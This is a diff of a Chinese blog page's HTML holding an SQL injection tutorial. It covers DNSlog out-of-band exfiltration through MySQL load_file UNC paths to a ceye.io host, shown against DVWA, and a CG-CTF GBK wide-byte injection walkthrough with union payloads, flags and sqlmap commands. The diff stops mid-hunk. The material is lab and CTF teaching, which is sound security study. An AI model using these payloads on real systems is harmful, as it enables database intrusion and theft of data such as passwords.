-<li>Window平台，Linux平台不支持。这个技术本质是利用 UNC 发起的 DNS 查询，因为 Linux 没有 UNC 路径，所以当处于 Linux 系统时，不能使用该方式获取数据，而且 UNC 的路径不能超过 128，否则会失败。当我们在使用 UNC 路径时，是会对域名进行 DNS 查询。</li>
+<li><p>Window平台，Linux平台不支持。这个技术本质是利用 UNC 发起的 DNS 查询，因为 Linux 没有 UNC 路径，所以当处于 Linux 系统时，不能使用该方式获取数据，而且 UNC 的路径不能超过 128，否则会失败。当我们在使用 UNC 路径时，是会对域名进行 DNS 查询。</p>
+</li>
 </ul>
 <p><strong>UNC路径:</strong></p>
 <blockquote>
@@ -1527,9 +1530,9 @@ database_name()
 </blockquote>
 <p>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式</p>
 <pre><code>\\192.168.1.132\test\
-</code></pre><p>这也就解释了为什么<code>CONCAT()</code>函数拼接了4个<code>\</code>了，因为转义的原因，4个<code>\</code>就变成了2个<code>\</code>，后面的<code>\\abc</code>变成了<code>\abc</code>，目的就是利用UNC路径。</p>
+</code></pre>
+<p>这也就解释了为什么<code>CONCAT()</code>函数拼接了4个<code>\</code>了，因为转义的原因，4个<code>\</code>就变成了2个<code>\</code>，后面的<code>\\abc</code>变成了<code>\abc</code>，目的就是利用UNC路径。</p>
 <p>因为 Linux 没有 UNC 路径这个东西，所以当 MySQL 处于 Linux 系统中的时候，是不能使用这种方式外带数据的。</p>
-<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -1537,14 +1540,11 @@ database_name()
 <th>原理图</th>
 </tr>
 </thead>
-<tbody>
-<tr>
-<td><img src="https://img.jwt1399.top//img/20200806155150.jpg" alt=""></td>
-<td><img src="https://img.jwt1399.top//img/20200806155100.png" alt=""></td>
+<tbody><tr>
+<td><img src="https://img.jwt1399.top//img/20200806155150.jpg"></td>
+<td><img src="https://img.jwt1399.top//img/20200806155100.png"></td>
 </tr>
-</tbody>
-</table>
-</div>
+</tbody></table>
 <p>如图所示，作为攻击者，提交注入语句，让数据库把需要查询的值和域名拼接起来，然后发生DNS查询，我们只要能获得DNS的日志，就得到了想要的值。所以我们需要有一个自己的域名，然后在域名商处配置一条NS记录，然后我们在NS服务器上面获取DNS日志即可。</p>
 <p> <strong>详细解释：</strong></p>
 <p>1、攻击者提交注入语句<code>select load_file(concat(&#39;\\\\&#39;,&#39;攻击语句&#39;,.XXX.ceye.io\\abc))</code></p>
@@ -1553,18 +1553,18 @@ database_name()
 <p>4、那么这一条带有数据库查询结果的域名就被提交到DNS服务器进行解析;</p>
 <p>5、此时，如果我们可以查看DNS服务器上的Dnslog就可以得到SQL注入结果。那么我们如何获得这条DNS查询记录呢？注意注入语句中的<code>ceye.io</code>，这其实是一个开放的DNSlog平台，在上面我们可以获取到有关<code>ceye.io</code>的DNS查询信息。</p>
 <p>6、当它发现域名中存在<code>ceye.io</code>时，它会将这条域名信息转到相应的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/NS/2907719?fr=aladdin">NS服务器</a>上，而通过<a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io</a>我们就可以查询到这条DNS解析记录。</p>
-<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h4 id="DVWA-SQL盲注"><a href="#DVWA-SQL盲注" class="headerlink" title="DVWA-SQL盲注"></a><strong>DVWA-SQL盲注</strong></h4><h5 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a><strong>查询数据库</strong></h5><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">1' and if((select load_file(concat('\\\\',(select database()),'.xxxx.ceye.io\\sql_test'))),1,0)#
+<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h4 id="DVWA-SQL盲注"><a href="#DVWA-SQL盲注" class="headerlink" title="DVWA-SQL盲注"></a><strong>DVWA-SQL盲注</strong></h4><h5 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a><strong>查询数据库</strong></h5><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and if((select load_file(concat('</span>\\\\'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.xxxx.ceye.io\\sql_test'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://img.jwt1399.top//img/20200806181940.png" alt=""></p>
-<h5 id="查询表"><a href="#查询表" class="headerlink" title="查询表"></a><strong>查询表</strong></h5><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">1' and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.xxxx.ceye.io\\sql_test'))),1,0)#
+<p><img src="https://img.jwt1399.top//img/20200806181940.png"></p>
+<h5 id="查询表"><a href="#查询表" class="headerlink" title="查询表"></a><strong>查询表</strong></h5><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and if((select load_file(concat('</span>\\\\'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.xxxx.ceye.io\\sql_test'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://img.jwt1399.top//img/20200806182142.png" alt=""></p>
-<h5 id="查询列"><a href="#查询列" class="headerlink" title="查询列"></a><strong>查询列</strong></h5><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">1' and if((select load_file(concat('\\\\',(select column_name from information_schema.columns where table_name='users' limit 4,1),'.xxxx.ceye.io\\sql_test'))),1,0)#
+<p><img src="https://img.jwt1399.top//img/20200806182142.png"></p>
+<h5 id="查询列"><a href="#查询列" class="headerlink" title="查询列"></a><strong>查询列</strong></h5><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and if((select load_file(concat('</span>\\\\'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token keyword">limit</span> <span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.xxxx.ceye.io\\sql_test'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://img.jwt1399.top//img/20200806182629.png" alt=""></p>
-<h5 id="查询值"><a href="#查询值" class="headerlink" title="查询值"></a><strong>查询值</strong></h5><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">1' and if((select load_file(concat('\\\\',(select password from users limit 0,1),'.xxxx.ceye.io\\sql_test'))),1,0)#
+<p><img src="https://img.jwt1399.top//img/20200806182629.png"></p>
+<h5 id="查询值"><a href="#查询值" class="headerlink" title="查询值"></a><strong>查询值</strong></h5><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and if((select load_file(concat('</span>\\\\'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> password <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.xxxx.ceye.io\\sql_test'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://img.jwt1399.top//img/20200806182944.png" alt=""></p>
+<p><img src="https://img.jwt1399.top//img/20200806182944.png"></p>
 <p><strong>参考：</strong></p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/222967.html">手把手带你利用SQLmap结合OOB技术实现音速盲注</a></li>
@@ -1574,8 +1574,7 @@ database_name()
 <p>宽字节注入是利用mysql的一个特性，<code>mysql在使用GBK编码的时候，会认为两个字符是一个汉字</code>【前一个ascii码要大于<code>128</code>，才到汉字的范围】</p>
 </blockquote>
 <p>在PHP配置文件中<code>magic_quotes_gpc=On</code>或者使用<code>addslashes</code>函数，<code>icov</code>函数,<code>mysql_real_escape_string</code>函数、<code>mysql_escape_string</code>函数等，提交的参数中如果带有单引号<code>&#39;</code>，就会被自动转义<code>\&#39;</code>，这样就使得多数注入攻击无效。</p>
-<p>当输入单引号，假设这里我们使用<code>addslashes</code>转义，对应的url编码是：<br><strong><code>&#39;</code> —&gt;<code>\&#39;</code>—&gt; <code>%5c%27</code></strong><br>当在前面引入一个ASCII大于128的字符【比如%df、%aa】，url编码变为：<br><strong><code>%df&#39;</code> —&gt; <code>%df\&#39;</code> —&gt; <code>(%df%5C)%27</code>—&gt;<code>(数据库GBK)</code>—&gt;<code>運&#39;</code></strong></p>
-<div class="table-container">
+<p>当输入单引号，假设这里我们使用<code>addslashes</code>转义，对应的url编码是：<br><strong><code>&#39;</code> –&gt;<code>\&#39;</code>–&gt; <code>%5c%27</code></strong><br>当在前面引入一个ASCII大于128的字符【比如%df、%aa】，url编码变为：<br><strong><code>%df&#39;</code> –&gt; <code>%df\&#39;</code> –&gt; <code>(%df%5C)%27</code>–&gt;<code>(数据库GBK)</code>–&gt;<code>運&#39;</code></strong></p>
 <table>
 <thead>
 <tr>
@@ -1583,182 +1582,180 @@ database_name()
 <th>%df%5C%27</th>
 </tr>
 </thead>
-<tbody>
-<tr>
-<td><img src="https://img.jwt1399.top//img/20200608094626.png" alt=""></td>
-<td><img src="https://img.jwt1399.top//img/20200608094630.png" alt=""></td>
+<tbody><tr>
+<td><img src="https://img.jwt1399.top//img/20200608094626.png"></td>
+<td><img src="https://img.jwt1399.top//img/20200608094630.png"></td>
 </tr>
-</tbody>
-</table>
-</div>
-<p>前端输入<strong><code>%df&#39;</code></strong>时首先经过上面<strong><code>addslashes</code></strong>函数和浏览器<strong><code>url编码</code></strong>转义变成了<strong><code>%df%5c%27</code></strong></p>
-<p>因为数据库使用<code>GBK</code>编码的话，<strong>%df%5c会被当作一个汉字处理,转换成了汉字”運”</strong>，从而使<code>%27</code>（单引号）逃出生天，成功绕过,利用这个特性从而可实施SQL注入的利用。</p>
+</tbody></table>
+<p>前端输入**<code>%df&#39;</code><strong>时首先经过上面</strong><code>addslashes</code><strong>函数和浏览器</strong><code>url编码</code><strong>转义变成了</strong><code>%df%5c%27</code>**</p>
+<p>因为数据库使用<code>GBK</code>编码的话，**%df%5c会被当作一个汉字处理,转换成了汉字”運”**，从而使<code>%27</code>（单引号）逃出生天，成功绕过,利用这个特性从而可实施SQL注入的利用。</p>
 <p><a target="_blank" rel="noopener" href="http://www.jsons.cn/gbkcode">在线GBK汉字编码字符集对照表</a></p>
-<h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><p><strong>题目来源：CG-CTF—-GBK Injection</strong></p>
+<h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><p><strong>题目来源：CG-CTF—GBK Injection</strong></p>
 <h4 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h4><p>题目地址：<a target="_blank" rel="noopener" href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">?id=1
-'''
-your sql:select id,title from news where id = '1'
+<pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>
+<span class="token string">''</span><span class="token string">'
+your sql:select id,title from news where id = '</span><span class="token number">1</span><span class="token string">'
 here is the information
-'''
+'</span><span class="token string">''</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>输入<code>1&#39;</code>可以看到<code>&#39;</code>被变成了<code>\&#39;</code>,应该是<code>addslashes</code>之类的函数转义的结果。</p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">?id=1'
-'''
-your sql:select id,title from news where id = '1\''
-here is the information    
-'''
+<pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'
+'</span><span class="token string">''</span>
+your sql:<span class="token keyword">select</span> id<span class="token punctuation">,</span>title <span class="token keyword">from</span> news <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token string">'1\''</span>
+here <span class="token operator">is</span> the information    
+<span class="token string">''</span>'
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>用上文宽字节构造方法，构造id=1%df’或者id=1%aa’，成功报错</p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">?id=1%df'
+<p>用上文宽字节构造方法，构造id&#x3D;1%df’或者id&#x3D;1%aa’，成功报错</p>
+<pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">df</span><span class="token string">'
 或者【只要ASCII大于128的字符就可以】
-?id=1%aa'
-'''
-your sql:select id,title from news where id = '1ß\''
+?id=1%aa'</span>
+<span class="token string">''</span><span class="token string">'
+your sql:select id,title from news where id = '</span><span class="token number">1</span>ß\'<span class="token string">'
 Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in SQL-GBK/index.php on line 10
-'''
+'</span><span class="token string">''</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>确定字段数</strong></p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">?id=1%aa' order by 1 --+    正常
-?id=1%aa' order by 2 --+    正常
-?id=1%aa' order by 3 --+    报错
-'''
+<pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">aa</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span> <span class="token comment" spellcheck="true">--+	正常</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">aa</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span> <span class="token comment" spellcheck="true">--+	正常</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">aa</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span> <span class="token comment" spellcheck="true">--+	报错</span>
+<span class="token string">''</span><span class="token string">'
 所以字段数为2
-'''
+'</span><span class="token string">''</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>确定显示位</strong></p>
 <p>前面必须为-1【前面查出来的值为null，才能显示后面我们想要的信息】，后面的信息才能显示出来</p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">?id=-1%aa' union select 1,2  --+
-'''
-your sql:select id,title from news where id = '-1歿'union select 1,2 -- '
-2
-'''
+<pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">aa</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span>  <span class="token comment" spellcheck="true">--+</span>
+<span class="token string">''</span><span class="token string">'
+your sql:select id,title from news where id = '</span><span class="token operator">-</span><span class="token number">1</span>歿'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token comment" spellcheck="true">-- '</span>
+<span class="token number">2</span>
+<span class="token string">''</span>'
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>确定了回显的位置是2</p>
 <p><strong>查询信息</strong></p>
-<pre class="line-numbers language-lang-objectivec"><code class="language-lang-objectivec">#查询数据库
-?id=-1%aa' union select 1,database()  --+
-'''
-sae-chinalover
-'''
-
+<pre class="line-numbers language-objectivec"><code class="language-objectivec">#查询数据库
+<span class="token operator">?</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>aa' <span class="token keyword">union</span> select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token operator">--</span><span class="token operator">+</span>
+<span class="token string">''</span>'
+sae<span class="token operator">-</span>chinalover
+<span class="token string">''</span>'
+    
 #查询表名
-?id=-1%aa' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+
-'''
-ctf,ctf2,ctf3,ctf4,news
-'''  
-
+<span class="token operator">?</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>aa' <span class="token keyword">union</span> select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema<span class="token punctuation">.</span>tables where table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">+</span>
+<span class="token string">''</span>'
+ctf<span class="token punctuation">,</span>ctf2<span class="token punctuation">,</span>ctf3<span class="token punctuation">,</span>ctf4<span class="token punctuation">,</span>news
+<span class="token string">''</span>'  
+    
 #查询字段名
-?id=-1%aa' union select 1, group_concat(column_name) from information_schema.columns where table_name=0x63746634 --+
+<span class="token operator">?</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>aa' <span class="token keyword">union</span> select <span class="token number">1</span><span class="token punctuation">,</span> <span class="token function">group_concat</span><span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema<span class="token punctuation">.</span>columns where table_name<span class="token operator">=</span><span class="token number">0x63746634</span> <span class="token operator">--</span><span class="token operator">+</span>
 
-'''这里表名table_name的值必须转换成16进制，如果不用16进制就得用引号包裹，当有addlashes函数就会转义引号，就会导致查询失败，使用16进制避免了这个问题。
-id,flag
-'''
+<span class="token string">''</span>'这里表名table_name的值必须转换成<span class="token number">16</span>进制，如果不用<span class="token number">16</span>进制就得用引号包裹，当有addlashes函数就会转义引号，就会导致查询失败，使用<span class="token number">16</span>进制避免了这个问题。
+id<span class="token punctuation">,</span>flag
+<span class="token string">''</span>'
 #查询字段信息
-?id=-1%aa' union select 1,group_concat(id,0x3a,flag) from ctf4 --+
-'''
-1:flag{this_is_sqli_flag}
-'''
-
-?id=-1%aa' union select 1,group_concat(content) from ctf2 --+     
-'''
-h4cked_By_w00dPeck3r,h4cked_By_w00dPeck3r,h4cked_By_w00dPeck3r,h4cked_By_w00dPeck3r,the flag is:nctf{query_in_mysql},h4cked_By_w00dPeck3r    
-'''
+<span class="token operator">?</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>aa' <span class="token keyword">union</span> select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span> from ctf4 <span class="token operator">--</span><span class="token operator">+</span>
+<span class="token string">''</span>'
+<span class="token number">1</span><span class="token punctuation">:</span>flag<span class="token punctuation">{</span>this_is_sqli_flag<span class="token punctuation">}</span>
+<span class="token string">''</span>'
+    
+<span class="token operator">?</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>aa' <span class="token keyword">union</span> select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span> from ctf2 <span class="token operator">--</span><span class="token operator">+</span>     
+<span class="token string">''</span>'
+h4cked_By_w00dPeck3r<span class="token punctuation">,</span>h4cked_By_w00dPeck3r<span class="token punctuation">,</span>h4cked_By_w00dPeck3r<span class="token punctuation">,</span>h4cked_By_w00dPeck3r<span class="token punctuation">,</span>the flag is<span class="token punctuation">:</span>nctf<span class="token punctuation">{</span>query_in_mysql<span class="token punctuation">}</span><span class="token punctuation">,</span>h4cked_By_w00dPeck3r    
+<span class="token string">''</span>'    
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>有2个flag，成功得到flag</p>
 <h4 id="使用sqlmap"><a href="#使用sqlmap" class="headerlink" title="使用sqlmap"></a><strong>使用sqlmap</strong></h4><p><strong>方法一：</strong>普通方法,根据提示选择选项</p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">sqlmap -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'"
+<pre class="line-numbers language-sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u "http:<span class="token comment" spellcheck="true">//chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'"</span>
 
-sqlmap -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'" --dbs
+sqlmap <span class="token operator">-</span>u "http:<span class="token comment" spellcheck="true">//chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'" --dbs</span>
 
-sqlmap -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'" -D sae-chinalover  --tables
+sqlmap <span class="token operator">-</span>u "http:<span class="token comment" spellcheck="true">//chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'" -D sae-chinalover  --tables</span>
 
-sqlmap -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'" -D sae-chinalover  -T --columns
+sqlmap <span class="token operator">-</span>u "http:<span class="token comment" spellcheck="true">//chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'" -D sae-chinalover  -T --columns</span>
 
-sqlmap -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'" -D sae-chinalover -T ctf4 -C flag --dump
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+sqlmap <span class="token operator">-</span>u "http:<span class="token comment" spellcheck="true">//chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'" -D sae-chinalover -T ctf4 -C flag --dump</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>方法二：</strong>使用脚本：<code>unmagicquotes.py</code>【作用：宽字符绕过】</p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">sqlmap -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" --tamper unmagicquotes --dbs
-'''
+<pre class="line-numbers language-sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u "http:<span class="token comment" spellcheck="true">//chinalover.sinaapp.com/SQL-GBK/index.php?id=1" --tamper unmagicquotes --dbs</span>
+<span class="token string">''</span><span class="token string">'
 available databases [2]:                                                                       [*] information_schema
 [*] sae-chinalover
-'''
+'</span><span class="token string">''</span>
 
-sqlmap -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" --tamper unmagicquotes -D sae-chinalover --tables
-'''
-Database: sae-chinalover
-[6 tables]
-+---------+
-| ctf     |
-| ctf2    |
-| ctf3    |
-| ctf4    |
-| gbksqli |
-| news    |
-+---------+
-'''
+sqlmap <span class="token operator">-</span>u "http:<span class="token comment" spellcheck="true">//chinalover.sinaapp.com/SQL-GBK/index.php?id=1" --tamper unmagicquotes -D sae-chinalover --tables</span>
+<span class="token string">''</span>'
+<span class="token keyword">Database</span>: sae<span class="token operator">-</span>chinalover
+<span class="token punctuation">[</span><span class="token number">6</span> <span class="token keyword">tables</span><span class="token punctuation">]</span>
+<span class="token operator">+</span><span class="token comment" spellcheck="true">---------+</span>
+<span class="token operator">|</span> ctf     <span class="token operator">|</span>
+<span class="token operator">|</span> ctf2    <span class="token operator">|</span>
+<span class="token operator">|</span> ctf3    <span class="token operator">|</span>
+<span class="token operator">|</span> ctf4    <span class="token operator">|</span>
+<span class="token operator">|</span> gbksqli <span class="token operator">|</span>
+<span class="token operator">|</span> news    <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment" spellcheck="true">---------+</span>
+<span class="token string">''</span>'
 
-sqlmap -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3" --tamper unmagicquotes -D sae-chinalover -T ctf4 --columns
-'''
-Database: sae-chinalover                                                                                                   
-Table: ctf4
-[2 columns]
-+--------+--------------+
-| Column | Type         |
-+--------+--------------+
-| flag   | varchar(100) |
-| id     | int(10)      |
-+--------+--------------+
-'''
+sqlmap <span class="token operator">-</span>u "http:<span class="token comment" spellcheck="true">//chinalover.sinaapp.com/SQL-GBK/index.php?id=3" --tamper unmagicquotes -D sae-chinalover -T ctf4 --columns</span>
+<span class="token string">''</span>'
+<span class="token keyword">Database</span>: sae<span class="token operator">-</span>chinalover                                                                                                   
+<span class="token keyword">Table</span>: ctf4
+<span class="token punctuation">[</span><span class="token number">2</span> <span class="token keyword">columns</span><span class="token punctuation">]</span>
+<span class="token operator">+</span><span class="token comment" spellcheck="true">--------+--------------+</span>
+<span class="token operator">|</span> <span class="token keyword">Column</span> <span class="token operator">|</span> <span class="token keyword">Type</span>         <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment" spellcheck="true">--------+--------------+</span>
+<span class="token operator">|</span> flag   <span class="token operator">|</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">|</span>
+<span class="token operator">|</span> id     <span class="token operator">|</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>      <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment" spellcheck="true">--------+--------------+</span>
+<span class="token string">''</span>'
 
-sqlmap -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3" --tamper unmagicquotes -D sae-chinalover -T ctf4 -C flag --dump
-'''
-Database: sae-chinalover
-Table: ctf4
-[1 entry]
-+-------------------------+
-| flag                    |
-+-------------------------+
-| flag{this_is_sqli_flag} |
-+-------------------------+
-'''
+sqlmap <span class="token operator">-</span>u "http:<span class="token comment" spellcheck="true">//chinalover.sinaapp.com/SQL-GBK/index.php?id=3" --tamper unmagicquotes -D sae-chinalover -T ctf4 -C flag --dump</span>
+<span class="token string">''</span>'
+<span class="token keyword">Database</span>: sae<span class="token operator">-</span>chinalover
+<span class="token keyword">Table</span>: ctf4
+<span class="token punctuation">[</span><span class="token number">1</span> entry<span class="token punctuation">]</span>
+<span class="token operator">+</span><span class="token comment" spellcheck="true">-------------------------+</span>
+<span class="token operator">|</span> flag                    <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment" spellcheck="true">-------------------------+</span>
+<span class="token operator">|</span> flag{this_is_sqli_flag} <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment" spellcheck="true">-------------------------+</span>
+<span class="token string">''</span>'
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>方法三</strong>：直接查询flag字段</p>
-<pre class="line-numbers language-lang-sql"><code class="language-lang-sql">sqlmap -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27" --search -C flag
---level 3 --risk 1 --thread 10
-'''
---threads 10 //如果你玩过 msfconsole的话会对这个很熟悉 sqlmap线程最高设置为10
---level 3 //sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高可到5
---risk 3 // 执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全
---search //后面跟参数 -D -T -C 搜索列（C），表（T）和或数据库名称（D） 如果你脑子够聪明，应该知道库列表名中可能会有ctf,flag等字样
-'''
+<pre class="line-numbers language-sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u "http:<span class="token comment" spellcheck="true">//chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27" --search -C flag</span>
